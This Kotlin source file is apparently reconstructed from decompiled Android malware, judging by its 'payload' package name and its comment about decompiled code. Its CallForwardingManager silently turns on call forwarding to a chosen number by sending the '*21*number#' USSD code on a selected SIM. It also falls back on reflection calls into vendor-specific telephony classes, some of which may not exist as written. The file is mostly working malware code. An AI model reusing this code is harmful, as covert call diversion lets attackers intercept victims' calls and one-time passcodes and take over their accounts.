package com.payload.jansiix0ne.util

import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import java.lang.reflect.Method

/**
 * Manager for handling Call Forwarding via USSD and OEM-specific methods
 * Based on decompiled code: C3165e.java
 */
class CallForwardingManager(private val context: Context) {
    
    companion object {
        private const val TAG = "CallForwardingManager"
    }

    /**
     * Set call forwarding for dual SIM devices
     * Based on decompiled code: m4885a method
     * @param phoneNumber Target phone number to forward calls to
     * @param simSlotIndex SIM slot index (0 for SIM1, 1 for SIM2)
     * @param enable true to enable forwarding, false to disable
     */
    fun setCallForwardingDualSim(phoneNumber: String, simSlotIndex: Int, enable: Boolean) {
        try {
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val subscriptionManager = SubscriptionManager.from(context)
            
            // Check permission
            if (context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "setCallForwardingDualSim: Permission Denied")
                return
            }
            
            val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList
            if (activeSubscriptions.isNullOrEmpty()) {
                Log.d(TAG, "setCallForwardingDualSim: No active sim found")
                return
            }
            
            if (simSlotIndex < activeSubscriptions.size) {
                val subscriptionInfo = activeSubscriptions[simSlotIndex]
                val telephonyManagerForSub = telephonyManager.createForSubscriptionId(subscriptionInfo.subscriptionId)
                val handler = Handler(Looper.getMainLooper())
                val callback = object : TelephonyManager.UssdResponseCallback() {
                    override fun onReceiveUssdResponse(
                        telephonyManager: TelephonyManager,
                        request: String,
                        response: CharSequence?
                    ) {
                        super.onReceiveUssdResponse(telephonyManager, request, response)
                        Log.d(TAG, "onReceiveUssdResponse: $response")
                    }

                    override fun onReceiveUssdResponseFailed(
                        telephonyManager: TelephonyManager,
                        request: String,
                        failureCode: Int
                    ) {
                        super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode)
                        Log.d(TAG, "onReceiveUssdResponseFailed: $failureCode")
                    }
                }
                
                val ussdCode = if (enable) {
                    "*21*$phoneNumber#"
                } else {
                    "#21#"
                }
                
                telephonyManagerForSub.sendUssdRequest(ussdCode, callback, handler)
                return
            } else {
                Log.d(TAG, "setCallForwardingDualSim: Invalid sim selection")
            }
        } catch (e: Exception) {
            Log.e(TAG, "USSD method failed", e)
        }
        
        // Fallback to OEM-specific methods
        val manufacturer = Build.MANUFACTURER.lowercase()
        
        when {
            manufacturer.contains("xiaomi") -> {
                try {
                    val miuiTelephony = Class.forName("android.telephony.MiuiTelephony")
                    val method = miuiTelephony.getMethod("setCallForwarding", Int::class.java, String::class.java)
                    method.invoke(null, if (enable) 1 else 0, phoneNumber)
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "Xiaomi method failed", e)
                }
            }
            
            manufacturer.contains("samsung") -> {
                try {
                    val samsungTelephony = Class.forName("com.samsung.android.telephony.TelephonyManager")
                    val method = samsungTelephony.getMethod(
                        "setCallForwardingOption",
                        Int::class.java,
                        String::class.java,
                        Int::class.java
                    )
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE)
                    val ussdCode = if (enable) "*21*$phoneNumber#" else "#21#"
                    method.invoke(telephonyManager, if (enable) 1 else 0, ussdCode, simSlotIndex)
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "Samsung method failed, trying alternative", e)
                    try {
                        val samsungTelephony = Class.forName("com.samsung.android.telephony.TelephonyManager")
                        val getDefaultMethod = samsungTelephony.getMethod("getDefault", Int::class.java)
                        val telephonyInstance = getDefaultMethod.invoke(null, simSlotIndex)
                        val method = samsungTelephony.getMethod("setCallForwardingOption", Int::class.java, String::class.java)
                        val ussdCode = if (enable) "*21*$phoneNumber#" else "#21#"
                        method.invoke(telephonyInstance, if (enable) 1 else 0, ussdCode)
                        return
                    } catch (e2: Exception) {
                        Log.e(TAG, "Samsung alternative method failed", e2)
                    }
                }
            }
            
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> {
                try {
                    val huaweiTelephony = Class.forName("com.huawei.android.telephony.TelephonyManagerEx")
                    val method = huaweiTelephony.getMethod("setCallForwardingOption", Int::class.java, String::class.java)
                    val ussdCode = if (enable) "*21*$phoneNumber#" else "#21#"
                    method.invoke(null, if (enable) 1 else 0, ussdCode)
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "Huawei method failed", e)
                }
            }
            
            manufacturer.contains("oppo") -> {
                try {
                    val oppoTelephony = Class.forName("com.oppo.telephony.OppoTelephonyManager")
                    val method = oppoTelephony.getMethod("setCallForwarding", Int::class.java, String::class.java)
                    method.invoke(null, if (enable) 1 else 0, phoneNumber)
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "Oppo method failed", e)
                }
            }
            
            manufacturer.contains("vivo") -> {
                try {
                    val vivoTelephony = Class.forName("com.vivo.telephony.VivoTelephonyManager")
                    val method = vivoTelephony.getMethod("setCallForwardingOption", Int::class.java, String::class.java)
                    val ussdCode = if (enable) "*21*$phoneNumber#" else "#21#"
                    method.invoke(null, if (enable) 1 else 0, ussdCode)
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "Vivo method failed", e)
                }
            }
        }
        
        // Generic OEM method (reflection)
        try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val method: Method = telephonyManager.javaClass.getMethod(
                "setCallForwardingOption",
                Int::class.java,
                String::class.java
            )
            method.isAccessible = true
            val ussdCode = if (enable) "*21*$phoneNumber#" else "#21#"
            method.invoke(telephonyManager, if (enable) 1 else 0, ussdCode)
        } catch (e: Exception) {
            Log.e(TAG, "Generic OEM method failed", e)
        }
    }
}
